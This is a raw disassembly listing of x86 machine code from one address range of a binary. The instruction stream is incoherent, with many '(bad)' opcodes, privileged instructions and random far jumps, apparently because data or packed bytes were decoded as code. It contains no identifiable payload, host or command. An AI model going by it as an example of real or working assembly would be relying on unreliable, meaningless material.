  423342:	std    
  423343:	leave  
  423344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423345:	or     eax,0x27851828
  42334a:	loope  0x4233b5
  42334c:	and    eax,0x54fb384d
  423351:	mov    edi,0x8efbb2b9
  423356:	mov    WORD PTR [edi],?
  423358:	ds test eax,0x5de9dd92
  42335e:	cdq    
  42335f:	stos   BYTE PTR es:[edi],al
  423360:	(bad)  
  423361:	pop    ss
  423362:	and    esp,DWORD PTR [edx+0x4c4cc8f8]
  423368:	ins    DWORD PTR es:[edi],dx
  423369:	clc    
  42336a:	and    eax,0xbe7ab828
  42336f:	pusha  
  423370:	mov    ebx,0x2d7aad4f
  423375:	inc    esp
  423376:	mov    edi,0xe56309f9
  42337b:	mov    bh,0x1
  42337d:	xor    BYTE PTR [ebx+0x29],0xef
  423381:	push   edx
  423382:	lods   eax,DWORD PTR ds:[esi]
  423383:	sub    dl,cl
  423385:	or     esp,DWORD PTR [ebx]
  423387:	and    BYTE PTR [ebx],cl
  423389:	mov    al,ds:0x32c3852b
  42338e:	gs fldz 
  423391:	les    ebp,FWORD PTR [eax]
  423393:	in     al,0xbe
  423395:	xor    ebx,ecx
  423397:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  423399:	dec    eax
  42339a:	adc    eax,0x1f9a2707
  42339f:	mov    ebp,0x860e0eda
  4233a4:	dec    ebp
  4233a5:	stos   BYTE PTR es:[edi],al
  4233a6:	ds sbb edi,esp
  4233a9:	xor    cl,BYTE PTR [ecx-0x25]
  4233ac:	add    bh,BYTE PTR [ebx-0x3e]
  4233af:	(bad)  [esi]
  4233b1:	dec    edx
  4233b2:	ficom  DWORD PTR [ebx]
  4233b4:	mov    ch,0xe0
  4233b6:	jns    0x423422
  4233b8:	or     eax,0xde87c44b
  4233bd:	and    eax,0x6035d37
  4233c2:	mov    ebx,0xf96ce29
  4233c7:	sbb    eax,0xd3b15f19
  4233cc:	sti    
  4233cd:	scas   eax,DWORD PTR es:[edi]
  4233ce:	lea    edx,[ecx+0x4]
  4233d1:	adc    DWORD PTR [ebp-0x2c1391c],esp
  4233d7:	cli    
  4233d8:	hlt    
  4233d9:	add    BYTE PTR [edi+0x2f02fa87],bh
  4233df:	in     al,0x2a
  4233e1:	xor    al,0x3c
  4233e3:	add    al,BYTE PTR [esi-0x17eaec97]
  4233e9:	scas   al,BYTE PTR es:[edi]
  4233ea:	fiadd  WORD PTR [edi-0x63]
  4233ed:	retf   0xae5b
  4233f0:	lds    ebx,FWORD PTR fs:[edx-0x46f3183f]
  4233f7:	adc    cl,BYTE PTR [eax-0x7053e5eb]
  4233fd:	addr16 in eax,dx
  4233ff:	xor    al,BYTE PTR [ebp*2-0x542b23ce]
  423406:	dec    esp
  423407:	mov    dl,0xf8
  423409:	jno    0x42347c
  42340b:	and    DWORD PTR [ebx-0x5],ebp
  42340e:	out    0x8c,eax
  423410:	in     eax,0x4e
  423412:	xlat   BYTE PTR ds:[ebx]
  423413:	out    0x67,al
  423415:	lahf   
  423416:	adc    esi,DWORD PTR ds:0xb5fda522
  42341c:	inc    esi
  42341d:	inc    eax
  42341e:	cld    
  42341f:	dec    ebp
  423420:	pop    ss
  423421:	fimul  WORD PTR [esp+ebx*1-0x4d]
  423425:	fwait
  423426:	pop    ecx
  423427:	mov    ?,ebx
  423429:	inc    edx
  42342a:	pop    ebx
  42342b:	jl     0x423477
  42342d:	cmc    
  42342e:	xor    DWORD PTR [esi-0x2b8b0009],0x90
	...
  423494:	add    BYTE PTR [eax],al
  423496:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42349d:	mov    edi,0xe016fb60
  4234a2:	or     DWORD PTR [ebx+ebp*4-0x26],esi
  4234a6:	imul   esi,DWORD PTR [edi+0x1],0x10700
  4234ad:	add    BYTE PTR [eax+edi*2],cl
  4234b0:	and    BYTE PTR [eax+0x231379f3],0xbf
  4234b7:	add    eax,0xb9f31efe
  4234bc:	pop    es
  4234bd:	mov    ebx,DWORD PTR [edx-0x7885d14e]
  4234c3:	add    eax,0x60e5e652
  4234c8:	(bad)  
  4234c9:	xlat   BYTE PTR ds:[ebx]
  4234ca:	jo     0x4234f8
  4234cc:	and    DWORD PTR [esp+eiz*2+0x4e],esi
  4234d0:	add    bh,BYTE PTR [edi+edx*8-0x51]
  4234d4:	cmp    cl,BYTE PTR [eax]
  4234d6:	or     cl,BYTE PTR ds:0x7a7fd8ce
  4234dc:	jg     0x42352e
  4234de:	jge    0x423552
  4234e0:	jnp    0x423534
  4234e2:	les    esp,FWORD PTR [edi+0x4188bd2e]
  4234e8:	shr    BYTE PTR [ecx+0x46ced5d7],cl
  4234ee:	mov    dl,0x4a
  4234f0:	mov    edi,0xbb3d752e
  4234f5:	out    dx,al
  4234f6:	mov    esp,0x1f989922
  4234fb:	fdivp  st(0),st
  4234fd:	in     eax,0x9a
  4234ff:	shl    BYTE PTR [ebp+0x2b83d0ac],0x45
  423506:	int3   
  423507:	adc    eax,0x70219049
  42350c:	dec    edx
  42350d:	retf   
  42350e:	cs repnz (bad) 
  423511:	mov    edx,0x4f2f336b
  423516:	arpl   WORD PTR [ecx],sp
  423518:	dec    edx
  423519:	cdq    
  42351a:	adc    DWORD PTR [ecx-0x34],esi
  42351d:	push   es
  42351e:	cmc    
  42351f:	and    BYTE PTR [esp+ecx*2+0x528424b0],ah
  423526:	test   DWORD PTR [eax],ecx
  423528:	add    ecx,DWORD PTR [ebx+0x23]
  42352b:	jmp    0xca5b7de0
  423530:	adc    edx,DWORD PTR [esi]
  423532:	fdiv   st,st(7)
  423534:	push   es
  423535:	addr16 xchg ecx,eax
  423537:	nop
  423538:	(bad)  
  423539:	(bad)  
  42353a:	out    0x68,eax
  42353c:	pop    ecx
  42353d:	jg     0x4234fa
  42353f:	imul   eax,DWORD PTR [eax+ebx*2+0x6b43bf97],0x45
  423547:	(bad)  
  423548:	aaa    
  423549:	sub    DWORD PTR [ecx-0x4a472fc7],edx
  42354f:	xor    eax,0xfed8d12
  423554:	adc    ebp,ebx
  423556:	sbb    edi,DWORD PTR [edi+0x74]
  423559:	lea    ebp,[edx-0x39]
  42355c:	gs (bad) 
  42355e:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  423560:	inc    eax
  423561:	sub    al,bl
  423563:	ins    BYTE PTR es:[edi],dx
  423564:	dec    ebx
  423565:	cld    
  423566:	imul   edi,DWORD PTR [edi],0xfffffff0
  423569:	add    ebp,DWORD PTR [eax-0x52]
  42356c:	pop    es
  42356d:	pop    edx
  42356e:	mov    dl,0xfa
  423570:	xor    al,0x39
  423572:	pop    es
  423573:	popf   
  423574:	push   cs
  423575:	loop   0x4235e7
  423577:	mov    ebx,0x4292da62
  42357c:	inc    edi
  42357d:	mov    ecx,ss
  42357f:	dec    ebp
  423580:	mov    BYTE PTR [ebx+0x1ea6530b],al
  423586:	ror    ecx,1
  423588:	fucom  st(1)
  42358a:	pop    ebx
  42358b:	bound  ebp,QWORD PTR [edi+0x2f]
  42358e:	(bad)  
  42358f:	enter  0xd8cc,0xdb
  423593:	and    ch,al
  423595:	sbb    edx,edi
  423597:	fstp   QWORD PTR [esi+eax*8+0x3a3d0a3c]
  42359e:	sub    bl,BYTE PTR [edi]
  4235a0:	mov    cl,0x75
  4235a2:	imul   esp,esp,0xe643700d
  4235a8:	mov    eax,0x86b0fdfc
  4235ad:	push   cs
  4235ae:	dec    edx
  4235af:	and    ebx,DWORD PTR [eax-0x2d2517a6]
	...
  423615:	add    BYTE PTR [eax+0x7f747c8f],al
  42361b:	test   DWORD PTR [eax+0x6a2d48ff],0x906c74da
  423625:	imul   esi,DWORD PTR [eax+0x78],0x1
  423629:	add    BYTE PTR [edi],al
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    dh,al
  42362f:	jbe    0x4235b2
  423631:	and    edi,DWORD PTR [eax]
  423633:	rcl    BYTE PTR ds:0x44428b96,1
  423639:	ret    
  42363a:	cdq    
  42363b:	dec    edi
  42363c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42363d:	or     eax,0x3e614c31
  423642:	jle    0x42362a
  423644:	das    
  423645:	test   eax,0x8de46c2a
  42364a:	xchg   edx,eax
  42364b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42364c:	fdiv   DWORD PTR [ebx-0x27e298c7]
  423652:	push   ds
  423653:	mov    edi,0x67af69c9
  423658:	mov    bl,0x1a
  42365a:	test   BYTE PTR [ebx-0x74fd0ca5],dl
  423660:	sbb    BYTE PTR [ecx+0x75693585],cl
  423666:	stc    
  423667:	cwde   
  423668:	mov    cl,0x7d
  42366a:	inc    ecx
  42366b:	mov    ds:0xf8c6e3f0,eax
  423670:	ret    
  423671:	xchg   edi,eax
  423672:	mov    dh,0x2
  423674:	stos   BYTE PTR es:[edi],al
  423675:	jns    0x423657
  423677:	int3   
  423678:	and    BYTE PTR [edi+0x64e5cf50],bl
  42367e:	retf   0xb80f
  423681:	mov    fs:0xab9f571,eax
  423687:	or     BYTE PTR [ebx],ch
  423689:	ret    0x586e
  42368c:	mov    esi,0xe7fdbfb6
  423691:	pusha  
  423692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423693:	arpl   WORD PTR [edi],dx
  423695:	std    
  423696:	out    dx,eax
  423697:	pop    ss
  423698:	loopne 0x423642
  42369a:	or     al,0xfa
  42369c:	xor    al,0xca
  42369e:	or     eax,0x23e01f5b
  4236a3:	add    BYTE PTR [ebx-0x6f0141df],al
  4236a9:	lods   eax,DWORD PTR ds:[esi]
  4236aa:	out    0x62,eax
  4236ac:	jmp    0x69de:0xd3ee2840
  4236b3:	daa    
  4236b4:	fild   QWORD PTR [edx+edx*2]
  4236b7:	js     0x4236c4
  4236b9:	sti    
  4236ba:	fdivr  QWORD PTR [edi]
  4236bc:	fst    QWORD PTR [ecx]
  4236be:	pusha  
  4236bf:	pop    ds
  4236c0:	scas   al,BYTE PTR es:[edi]
  4236c1:	dec    ebx
  4236c2:	mov    edi,DWORD PTR [ecx]
  4236c4:	ret    0x47bc
  4236c7:	test   DWORD PTR [eax+0x2a],edx
  4236ca:	inc    esp
  4236cb:	mov    al,ds:0x50824b1e
  4236d0:	mov    dh,0xae
  4236d2:	ins    DWORD PTR es:[edi],dx
  4236d3:	pop    ecx
  4236d4:	push   eax
  4236d5:	in     al,dx
  4236d6:	jp     0x42372b
  4236d8:	sbb    al,0xe1
  4236da:	ficom  DWORD PTR [edi-0x1f]
  4236dd:	into   
  4236de:	mov    ebx,0x49f06735
  4236e3:	inc    esp
  4236e4:	stc    
  4236e5:	pushf  
  4236e6:	fisttp QWORD PTR [ecx+ebx*8]
  4236e9:	fst    QWORD PTR [esi+0x4c4cc56a]
  4236ef:	xor    al,0x1
  4236f1:	inc    ebp
  4236f2:	outs   dx,BYTE PTR ds:[esi]
  4236f3:	out    dx,al
  4236f4:	test   eax,0xbae57496
  4236f9:	jbe    0x423744
  4236fb:	adc    eax,0x176ee9f0
  423700:	imul   edx,DWORD PTR [esp+edi*8],0x52d37405
  423707:	retf   
  423708:	xor    eax,0xc5648897
  42370d:	stos   DWORD PTR es:[edi],eax
  42370e:	loop   0x42369c
  423710:	jle    0x4236b7
  423712:	lods   al,BYTE PTR ds:[esi]
  423713:	pop    esp
  423714:	mov    ebp,0xcc9bb9cf
  423719:	mov    esi,0x140c859b
  42371e:	mov    al,ds:0x7232b43c
  423723:	cmp    BYTE PTR [ebp+0x2d],cl
  423726:	jbe    0x423734
  423728:	lods   al,BYTE PTR ds:[esi]
  423729:	cmp    eax,0x184dddcb
  42372e:	jbe    0x4236c8
  423730:	xor    BYTE PTR [ebx-0x8],dl
  423733:	cld    
  423734:	out    dx,al
	...
  423795:	add    BYTE PTR [ebx+eiz*1],dh
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0x8cbb6634
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    bl,ch
  4237af:	push   ecx
  4237b0:	adc    BYTE PTR [edx-0x72646dc9],cl
  4237b6:	push   eax
  4237b7:	fdivr  DWORD PTR [esi+ecx*4]
  4237ba:	mov    ds:0xc621e95b,al
  4237bf:	imul   esp,DWORD PTR [edi],0x74
  4237c2:	scas   eax,DWORD PTR es:[edi]
  4237c3:	sbb    BYTE PTR [esi-0x1d0dcb9f],bl
  4237c9:	dec    edx
  4237ca:	sub    edi,ebx
  4237cc:	test   BYTE PTR [esi-0x2967a416],al
  4237d2:	dec    ebp
  4237d3:	(bad)  
  4237d4:	mov    ch,0xb0
  4237d6:	inc    eax
  4237d7:	call   0xac1edc38
  4237dc:	iret   
  4237dd:	sub    al,ch
  4237df:	gs xchg edx,eax
  4237e1:	add    bl,BYTE PTR [edi-0x33]
  4237e4:	sti    
  4237e5:	aas    
  4237e6:	(bad)  
  4237e7:	sub    dl,BYTE PTR ds:0xfd3c76c6
  4237ed:	nop
  4237ee:	jb     0x4237d4
  4237f0:	(bad)  
  4237f1:	inc    esi
  4237f2:	cs pop ss
  4237f4:	lock imul edi,DWORD PTR [edi],0xce085e58
  4237fb:	or     dh,BYTE PTR [ebx+0x69]
  4237fe:	sbb    BYTE PTR [eax+esi*1+0x72],dl
  423802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423803:	and    esp,eax
  423805:	mov    ebp,0x51ecf961
  42380a:	cmp    edx,esi
  42380c:	leave  
  42380d:	std    
  42380e:	out    0x98,eax
  423810:	pusha  
  423811:	sub    ecx,0x622bb170
  423817:	mov    WORD PTR [ecx-0x4d],fs
  42381a:	mov    ebp,0x12699513
  42381f:	mov    dh,0xc
  423821:	xchg   ecx,ecx
  423823:	ins    BYTE PTR es:[edi],dx
  423824:	or     BYTE PTR [ecx+0x6c],cl
  423827:	push   0x2
  423829:	pop    ds
  42382a:	inc    edx
  42382b:	(bad)  
  42382c:	push   ds
  42382d:	jae    0x42385b
  42382f:	aam    0xfa
  423831:	shr    DWORD PTR [eax],0x3f
  423834:	stos   DWORD PTR es:[edi],eax
  423835:	adc    esp,DWORD PTR [ebx-0x6a]
  423838:	sbb    esp,DWORD PTR [ecx]
  42383a:	xor    eax,0x26f09aec
  42383f:	fdivr  DWORD PTR [ebx-0x74001f]
  423845:	pop    edx
  423846:	sahf   
  423847:	lock and BYTE PTR [eax-0x65],bh
  42384b:	sub    al,BYTE PTR [ebp-0x55]
  42384e:	xchg   edx,eax
  42384f:	and    eax,0x7acd93b6
  423854:	mov    ds:0x30d17d1a,eax
  423859:	pop    es
  42385a:	and    al,0x51
  42385c:	jmp    0x94b1b985
  423861:	and    eax,0x3df3431f
  423866:	shl    DWORD PTR [ebx-0x38],cl
  423869:	sub    al,0x8d
  42386b:	arpl   WORD PTR [ebx+0x6e382f84],si
  423871:	aas    
  423872:	dec    esi
  423873:	mov    al,0x5c
  423875:	pop    eax
  423876:	add    eax,0x4d2f189a
  42387b:	or     ch,BYTE PTR [edi+edx*4+0x692ef4fc]
  423882:	stc    
  423883:	mov    al,ds:0xb2a186ee
  423888:	mov    dl,0x77
  42388a:	sub    al,BYTE PTR [edi]
  42388c:	int    0x9c
  42388e:	jnp    0x4238ee
  423890:	repz pop edi
  423892:	cmp    BYTE PTR [edx-0x623b126d],cl
  423898:	daa    
  423899:	inc    esp
  42389a:	and    cl,bh
  42389c:	jge    0x423849
  42389e:	push   ds
  42389f:	ja     0x423862
  4238a1:	jle    0x4238e2
  4238a3:	add    bh,BYTE PTR [edx]
  4238a5:	add    BYTE PTR [edx+0x1f5eb5],0xcf
  4238ac:	push   es
  4238ad:	jae    0x42392d
  4238af:	fnstenv [eax+0x9]
  4238b2:	lods   al,BYTE PTR ds:[esi]
  4238b3:	push   ds
  4238b4:	test   DWORD PTR [eax],0x0
	...
  423916:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    eax,ebp
  423923:	popa   
  423924:	or     al,0xf4
  423926:	jle    0x4239a2
  423928:	add    DWORD PTR [eax],eax
  42392a:	pop    es
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    dh,al
  42392f:	shl    BYTE PTR [eax+edi*4],cl
  423932:	dec    edx
  423933:	mov    ds:0xc12cbaeb,al
  423938:	cmp    eax,0xe12d1c6e
  42393d:	sbb    eax,0x8feb8ce9
  423942:	test   ah,dl
  423944:	sbb    eax,0xdb58ff8c
  423949:	sbb    DWORD PTR [ebx+edi*4-0x26cc6bfc],esp
  423950:	mov    al,0x4d
  423952:	sub    al,0x6
  423954:	es es mov eax,0x5cc0e796
  42395b:	out    dx,eax
  42395c:	push   edx
  42395d:	adc    al,0x14
  42395f:	shl    BYTE PTR [ebp-0x46],0x80
  423963:	mov    eax,ds:0xd8aa46c
  423968:	(bad)  
  423969:	pop    es
  42396a:	clc    
  42396b:	lock pop ds
  42396d:	sbb    eax,0x97cb59c6
  423972:	pop    ecx
  423973:	mov    ebp,DWORD PTR [ecx-0xdf880b8]
  423979:	fneni(8087 only) 
  42397b:	hlt    
  42397c:	mov    ds:0xeb5a1c3e,eax
  423981:	shl    BYTE PTR [eax-0x1e],1
  423984:	adc    ch,ch
  423986:	xor    al,0x72
  423988:	sbb    eax,0xfa90419b
  42398d:	loop   0x4239e3
  42398f:	hlt    
  423990:	les    esp,FWORD PTR [ecx]
  423992:	mov    edi,0xbe15c5ea
  423997:	mov    ah,0x73
  423999:	aaa    
  42399a:	loop   0x42397d
  42399c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42399d:	pop    es
  42399e:	mov    ah,0xba
  4239a0:	ret    0xf291
  4239a3:	xor    al,0xe
  4239a5:	push   esi
  4239a6:	ret    0x1bc8
  4239a9:	dec    edx
  4239aa:	push   esi
  4239ab:	add    ch,BYTE PTR [eax]
  4239ad:	dec    ebx
  4239ae:	popf   
  4239af:	pop    esi
  4239b0:	pusha  
  4239b1:	adc    al,0x69
  4239b3:	xor    eax,0x27b65e17
  4239b8:	jo     0x423955
  4239ba:	mov    DWORD PTR [ebx],eax
  4239bc:	ret    
  4239bd:	mov    WORD PTR [edx+0x1],cs
  4239c0:	in     al,dx
  4239c1:	push   0xb6b51a21
  4239c6:	fdivr  st,st(0)
  4239c8:	test   DWORD PTR [edi],esi
  4239ca:	loop   0x4239eb
  4239cc:	add    eax,0x5f56ab92
  4239d1:	stos   DWORD PTR es:[edi],eax
  4239d2:	mov    ah,0x9c
  4239d4:	or     eax,0xc3353203
  4239d9:	xchg   ebx,eax
  4239da:	jns    0x4239d4
  4239dc:	mov    dl,0x53
  4239de:	and    ch,cl
  4239e0:	and    DWORD PTR [ebp+0x61],esp
  4239e3:	in     al,0x4a
  4239e5:	popf   
  4239e6:	shr    DWORD PTR [ecx+0x524386b8],1
  4239ec:	out    0xbf,eax
  4239ee:	cdq    
  4239ef:	xchg   ebp,eax
  4239f0:	(bad)  
  4239f1:	es mov bl,0xe9
  4239f4:	pop    ss
  4239f5:	mov    eax,ds:0x7226a898
  4239fa:	push   esp
  4239fb:	int    0x76
  4239fd:	pop    ds
  4239fe:	int3   
  4239ff:	and    al,0xba
  423a01:	pusha  
  423a02:	lods   al,BYTE PTR ds:[esi]
  423a03:	cdq    
  423a04:	call   0xa544:0x350e51c2
  423a0b:	sub    DWORD PTR [ebx-0x49147603],eax
  423a11:	outs   dx,BYTE PTR ds:[esi]
  423a12:	std    
  423a13:	bound  esi,QWORD PTR [edx+0x24f33d2c]
  423a19:	push   ebp
  423a1a:	dec    bp
  423a1c:	invd   
  423a1e:	jmp    0x4239ce
  423a20:	push   ds
  423a21:	mov    esp,DWORD PTR [esi+edx*8-0x57]
  423a25:	xchg   edi,eax
  423a26:	jns    0x423a9f
  423a28:	call   0x3e05:0xa033533a
  423a2f:	fidivr WORD PTR [ebp-0x13]
  423a32:	push   ds
  423a33:	xchg   esp,eax
  423a34:	cmp    eax,0x0
	...
  423a95:	add    BYTE PTR [eax],dh
  423a97:	cmp    eax,0xdf7d9f75
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	mov    edx,ss
  423aa4:	das    
  423aa5:	fild   WORD PTR [ebp+0x700017b]
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    BYTE PTR [edi+0x73],bl
  423ab0:	mov    ds:0x278440c3,eax
  423ab5:	retf   
  423ab6:	jmp    0x423a75
  423ab8:	sbb    DWORD PTR [esi],ecx
  423aba:	jecxz  0x423a46
  423abc:	lock xor ecx,DWORD PTR [eax+0x63d1a9fe]
  423ac3:	in     eax,dx
  423ac4:	sub    al,0xa4
  423ac6:	pop    ds
  423ac7:	push   cs
  423ac8:	lock std 
  423aca:	jae    0x423a61
  423acc:	cmp    cl,0xbc
  423acf:	mov    esp,0x536affbd
  423ad4:	xchg   ebp,eax
  423ad5:	sbb    cl,ch
  423ad7:	imul   ebx,DWORD PTR [eax+0x7e],0x2226cadb
  423ade:	sar    DWORD PTR [eax+0x75],0x38
  423ae2:	outs   dx,BYTE PTR ds:[esi]
  423ae3:	add    al,0x6
  423ae5:	imul   edi,DWORD PTR [edi-0x4e],0x13cbb27d
  423aec:	arpl   di,bx
  423aee:	(bad)  
  423af0:	sub    eax,0xbce4161a
  423af5:	dec    ebx
  423af6:	jmp    0x2c8c:0xeb1a8695
  423afd:	stc    
  423afe:	xchg   ecx,eax
  423aff:	cld    
  423b00:	imul   edi,DWORD PTR ds:0x1e7256e1,0xffffffed
  423b07:	xchg   ebp,eax
  423b08:	mov    edi,0xb2cd03f3
  423b0d:	mov    al,0x9f
  423b0f:	(bad)
  423b12:	es leave 
  423b14:	mov    dl,0xba
  423b16:	test   DWORD PTR [ebx-0x59],ecx
  423b19:	xchg   edi,eax
  423b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b1b:	mov    dh,BYTE PTR [ebx]
  423b1d:	ins    BYTE PTR es:[edi],dx
  423b1e:	add    cl,ch
  423b20:	(bad)  
  423b21:	div    BYTE PTR [ebp+0x6637cf2a]
  423b27:	xor    BYTE PTR [edi-0x1c6cac00],0x49
  423b2e:	or     al,0x2
  423b30:	mov    DWORD PTR [edi-0x7],edx
  423b33:	test   al,0xe
  423b35:	int3   
  423b36:	cli    
  423b37:	int3   
  423b38:	js     0x423b6f
  423b3a:	hlt    
  423b3b:	dec    ecx
  423b3c:	adc    eax,0xae53969d
  423b41:	arpl   bx,di
  423b43:	aad    0x46
  423b45:	adc    BYTE PTR [esi-0x66],ch
  423b48:	and    bh,bl
  423b4a:	imul   BYTE PTR [ebx+0x75]
  423b4d:	call   0x1c04:0x4ff66775
  423b54:	xor    cl,BYTE PTR [bx]
  423b57:	jns    0x423bae
  423b59:	icebp  
  423b5a:	sti    
  423b5b:	mov    al,ds:0x1dce9e78
  423b60:	adc    al,0xf8
  423b62:	jp     0x423b05
  423b64:	pop    es
  423b65:	sub    esi,esi
  423b67:	push   edi
  423b68:	das    
  423b69:	in     eax,0xf
  423b6b:	pop    ebp
  423b6c:	sbb    ah,0xc8
  423b6f:	mov    WORD PTR [eax],ss
  423b71:	pop    ebp
  423b72:	mov    ah,0xfe
  423b74:	cmp    DWORD PTR [ecx+edi*8-0x5c71789e],esp
  423b7b:	inc    edx
  423b7c:	cmp    BYTE PTR [ebx-0x2a5ff010],0xfe
  423b83:	aaa    
  423b84:	cmp    al,0x8b
  423b86:	in     eax,0x17
  423b88:	push   eax
  423b89:	mov    ds:0xe52cc7ca,al
  423b8e:	jno    0x423b51
  423b90:	sti    
  423b91:	lods   eax,DWORD PTR ds:[esi]
  423b92:	outs   dx,DWORD PTR ds:[esi]
  423b93:	enter  0x8cbc,0x20
  423b97:	push   eax
  423b98:	sbb    al,0x5a
  423b9a:	inc    eax
  423b9b:	(bad)  
  423b9c:	pop    ecx
  423b9d:	ret    
  423b9e:	jbe    0x423c1a
  423ba0:	scas   eax,DWORD PTR es:[edi]
  423ba1:	ins    BYTE PTR es:[edi],dx
  423ba2:	xchg   esp,eax
  423ba3:	jo     0x423b74
  423ba5:	mov    edi,0x23fb8fb4
  423baa:	jmp    0xd391f583
  423baf:	mov    ds:0xaf0ab158,al
  423bb4:	add    BYTE PTR cs:[eax],al
	...
  423c13:	add    BYTE PTR [eax],al
  423c15:	add    ch,bh
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	aaa    
  423c23:	aaa    
  423c24:	sub    ah,BYTE PTR [edi]
  423c26:	mov    WORD PTR [ecx+eax*1+0x0],?
  423c2a:	pop    es
  423c2b:	add    DWORD PTR [eax],eax
  423c2d:	add    BYTE PTR [ecx+ebp*4-0x2846738a],cl
  423c34:	data16 cmp al,0xf8
  423c37:	adc    bl,cl
  423c39:	jmp    0xecb6:0xb7c4e8ae
  423c40:	call   0x540e4e6a
  423c45:	mov    bh,0xf1
  423c47:	or     ch,BYTE PTR [edx-0x6c]
  423c4a:	sbb    DWORD PTR [edi+eax*1],eax
  423c4d:	jae    0x423c2e
  423c4f:	mov    cx,0xdaa
  423c53:	jmp    0x423cb1
  423c55:	pop    ebx
  423c56:	inc    edx
  423c57:	xchg   cl,bl
  423c59:	xchg   BYTE PTR [edx-0x217a6b3c],bh
  423c5f:	cmp    al,0xdc
  423c61:	pop    edx
  423c62:	leave  
  423c63:	xlat   BYTE PTR ds:[ebx]
  423c64:	or     DWORD PTR [edi-0x4402549f],ecx
  423c6a:	inc    ebp
  423c6b:	xchg   edx,eax
  423c6c:	pop    edx
  423c6d:	mov    eax,0xbc6de396
  423c72:	or     eax,0x1ab12823
  423c77:	out    dx,al
  423c78:	push   ds
  423c79:	hlt    
  423c7a:	(bad)  
  423c7b:	mov    edx,0x54787bd6
  423c80:	cld    
  423c81:	fwait
  423c82:	or     eax,0x2d6176af
  423c87:	cli    
  423c88:	arpl   WORD PTR [edi],si
  423c8a:	and    BYTE PTR [ecx+0x62],dh
  423c8d:	pop    ebx
  423c8e:	repz mov bl,0x6b
  423c91:	inc    ecx
  423c92:	mov    ds:0x792e621d,al
  423c97:	in     eax,dx
  423c98:	sbb    BYTE PTR [esi-0x36],0x54
  423c9c:	lea    edi,[esi+0x637ff00f]
  423ca2:	sub    eax,esi
  423ca4:	mov    WORD PTR [edi],ds
  423ca6:	dec    edi
  423ca7:	lea    esi,[eax+edx*4+0x5a478380]
  423cae:	jmp    0x423c81
  423cb0:	data16 and ah,bh
  423cb3:	adc    DWORD PTR [esi-0x80],ecx
  423cb6:	arpl   WORD PTR [ecx-0x6d],di
  423cb9:	clc    
  423cba:	cmp    DWORD PTR [edi-0x6e3e5bfc],edi
  423cc0:	shl    DWORD PTR [eax],0xb
  423cc3:	lock lea edi,[edx]
  423cc6:	div    DWORD PTR [ebx+0x2d3d3d70]
  423ccc:	jp     0x423d34
  423cce:	pop    edx
  423ccf:	mov    dl,0x8c
  423cd1:	das    
  423cd2:	call   0x2328:0x9c9b14ef
  423cd9:	test   al,0x88
  423cdb:	xor    BYTE PTR [eax+0x622fb2a6],bh
  423ce1:	mul    esi
  423ce3:	push   0xa2c5bc03
  423ce8:	or     edi,DWORD PTR ds:0x73585980
  423cee:	push   0xf4b9625f
  423cf3:	lds    edx,FWORD PTR [ebx+ebx*4]
  423cf6:	cli    
  423cf7:	stos   DWORD PTR es:[edi],eax
  423cf8:	mov    dh,0xec
  423cfa:	xchg   ecx,eax
  423cfb:	retf   
  423cfc:	mov    esp,0xcef05add
  423d01:	mov    ebx,0x93f43f25
  423d06:	jge    0x423ce3
  423d08:	and    BYTE PTR [edi+0x5e],ah
  423d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d0c:	imul   edx,edi,0x87d2ae41
  423d12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d13:	sub    eax,0xb02eb099
  423d18:	cwde   
  423d19:	dec    edi
  423d1a:	jmp    0x5357:0x6e84f90c
  423d21:	inc    ecx
  423d22:	ja     0x423d81
  423d24:	pop    edi
  423d25:	fwait
  423d26:	push   edx
  423d27:	and    BYTE PTR [ebx+edx*8-0x79],bl
  423d2b:	mov    esi,0xc73ec35b
  423d30:	hlt    
  423d31:	push   ebx
  423d32:	and    BYTE PTR [edi+0x61],bh
	...
  423d95:	add    BYTE PTR [edx-0xa],ah
  423d98:	xchg   DWORD PTR [ecx],ecx
  423d9a:	xchg   edi,eax
  423d9b:	jns    0x423d8b
  423d9d:	dec    edi
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423da3:	imul   DWORD PTR [edx+0x17d931f]
  423da9:	add    BYTE PTR [edi],al
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    BYTE PTR [ecx-0x6f3fb6f0],dl
  423db3:	jb     0x423d9e
  423db5:	push   ss
  423db6:	in     al,dx
  423db7:	inc    ecx
  423db8:	pop    ebx
  423db9:	loop   0x423e02
  423dbb:	inc    edi
  423dbc:	jmp    0x7db6:0x135186eb
  423dc3:	pop    ebx
  423dc4:	and    ch,BYTE PTR [ecx+0xf48845c]
  423dca:	mov    eax,ds:0xf22d0a34
  423dcf:	int    0xa
  423dd1:	je     0x423d7d
  423dd3:	push   eax
  423dd4:	jg     0x423dcb
  423dd6:	ss pop esi
